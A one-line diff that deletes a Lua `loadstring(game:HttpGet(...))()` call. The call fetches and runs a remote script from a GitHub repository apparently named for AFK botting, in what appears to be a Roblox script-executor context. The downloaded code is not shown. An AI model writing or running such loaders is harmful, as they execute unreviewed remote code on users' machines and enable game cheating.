@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/afkbotting/101/main/newfile.lua"))()
+
